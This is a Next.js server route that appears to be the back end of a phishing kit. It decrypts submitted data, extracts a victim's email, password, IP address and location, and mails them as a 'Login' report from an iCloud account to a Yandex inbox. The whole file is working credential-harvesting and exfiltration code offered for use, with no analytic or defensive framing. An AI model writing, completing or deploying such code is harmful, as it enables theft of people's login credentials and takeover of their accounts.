"use server"
// import {NextApiRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

import crypto from 'crypto';

const key = Buffer.from(process.env.NEXT_PUBLIC_ENCRYPTION_KEY, 'base64');

// export const runtime = 'nodejs';

const user = process.env.EMAIL;
const pass = process.env.PASSWORD;

export default async function handler(req, res) {
  try {
          const body = await req.body;
          const { vtext, ivv } = body;
        // Decode base64 into Uint8Array
          const encryptedArray = Uint8Array.from(atob(vtext), c => c.charCodeAt(0));
          const ivArray = Uint8Array.from(atob(ivv), c => c.charCodeAt(0));

          const tag = encryptedArray.slice(-16); // last 16 bytes = auth tag
          const data = encryptedArray.slice(0, -16);

          // Set up decipher with AES-256-GCM
          const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(ivArray));
          decipher.setAuthTag(Buffer.from(tag))

          const decrypted = Buffer.concat([
            decipher.update(Buffer.from(data)),
            decipher.final(),
          ]);

          const json = JSON.parse(decrypted.toString('utf8'));
          const {email, password, country, city, region, host_ip, hostname, postal_code, timezone, date} = json
          const user_agent = req.headers['user-agent']
          const message = `REPORT UPDATE \n ----------------------------------- \n \nEmail: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nRegion: ${region}\nHost_Ip: ${host_ip}\nHostname: ${hostname}\nTime Zone: ${timezone}\nPostal Code: ${postal_code}\nDate: ${date}\nUser_agent: ${user_agent}`
          // let qs = `?start=1&limit=5000&convert=USD`

          console.log('Log: ', message)

          const transporter = nodemailer.createTransport({
            // service: "Private Email", //"zoho"
            host: "smtp.mail.me.com" ,//"smtp.zoho.com" salespersonels.online
            port: 587,//465
            secure: false,
            requireTLS: true,
            auth: {
              user,
              pass,
            },
          });

          const mailOptions = {
            from: "ajala_ehis@icloud.com",
            to: "omdbox@yandex.com",
            subject: `Login: | ${email} | ${country} | ${host_ip}`,
            text: message,
          };

          transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
              return console.error("Error sending email:", error);
            }
            console.log("Email sent:", info.response);
          });
          console.log('Message sent successfully')
          res.status(200).send({message: 'Message sent successful'})
          // return NextResponse.json(
          //     { message: "Message sent successfully" },
          //     { status: 200 },
    //   );

  } catch (error) {
    console.log(`Failed to send message: ${error}`)
    res.status(500).send({error: "Failed to send message."})
    // new NextResponse("Failed to send message.", { status: 500 })
  }
}

